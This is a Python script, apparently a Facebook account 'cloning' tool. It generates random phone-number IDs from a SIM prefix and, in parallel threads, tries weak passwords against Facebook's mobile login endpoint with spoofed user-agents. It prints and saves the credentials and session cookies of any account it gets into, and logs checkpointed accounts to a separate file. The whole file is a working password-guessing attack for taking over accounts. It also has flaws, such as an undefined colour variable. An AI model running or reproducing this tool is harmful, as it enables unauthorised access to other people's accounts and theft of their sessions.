import os, time, sys, random, requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Configuration & Memory
loop = 0
ok = []
cp = []

# Terminal Colors
G = '\033[1;32m'
W = '\033[1;37m'
R = '\033[1;31m'
Y = '\033[1;33m'

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
| [✓] OWNER        : MD MALEK ISLAM (JILANI)   |
| [✓] LOGIC        : REFACTOR RESPONSE V3      |
| [✓] STATUS       : 100% REAL ENGINE          |
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")

def main():
    banner()
    print(f'{G}[1] START REAL-TIME CLONING')
    print(f'[0] EXIT')
    opt = input(f'{Y}[?] SELECT : {W}')
    if opt == '1':
        start_cloning()
    else:
        sys.exit()

def start_cloning():
    banner()
    code = input(f'{G}[+] SIM CODE (e.g. 017): {W}')
    limit = int(input(f'{G}[+] CLONING LIMIT: {W}'))
    
    banner()
    print(f'{G}[✓] REFACTOR ENGINE BOOTING...{W}')
    print(f'{G}--------------------------------------------------{W}')

    with ThreadPool(max_workers=30) as pool:
        for _ in range(limit):
            # NO RANDOM PRINT LOGIC HERE
            num = "".join(random.choice("0123456789") for _ in range(8))
            uid = code + num
            # Password Priority: Last 6 digits & Full ID
            pws = [uid[-6:], uid, '123456', '575757', '@@@###'] 
            pool.submit(login_engine, uid, pws, limit)

def login_engine(uid, pws, limit):
    global loop, ok
    sys.stdout.write(f'\r{W}[PROCESSING] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    for pas in pws:
        session = requests.Session()
        # Dynamic Real User-Agents
        ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,13)}; SM-G9{random.randint(100,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,126)}.0.0.0 Mobile Safari/537.36"
        
        # Real Header Implementation
        headers = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'referer': 'https://m.facebook.com/login/',
            'user-agent': ua,
        }
        
        # Rafi Sar's Response Logic Link
        url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        data = {
            "lsd": "AVpY",
            "jazoest": "2931",
            "m_ts": str(int(time.time())),
            "email": uid,
            "pass": pas
        }

        try:
            # TRUE RESPONSE CHECKING
            res = session.post(url, data=data, headers=headers, timeout=30)
            
            if "c_user" in session.cookies.get_dict():
                kuki = (";").join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                print(f'\n{G}[SUCCESS-OK] {uid} | {pas}{W}')
                print(f'{G}[COOKIES] {kuki}{W}\n')
                ok.append(uid)
                open('ok.txt', 'a').write(f'{uid}|{pas}|{kuki}\n')
                break
            elif "checkpoint" in session.cookies.get_dict():
                # Handling Checkpoint IDs
                print(f'\n{Y}[CHECKPOINT] {uid} | {pas}{W}')
                cp.append(uid)
                open('cp.txt', 'a').write(f'{uid}|{pas}\n')
                break
        except:
            pass
            
    loop += 1

if __name__ == "__main__":
    main()
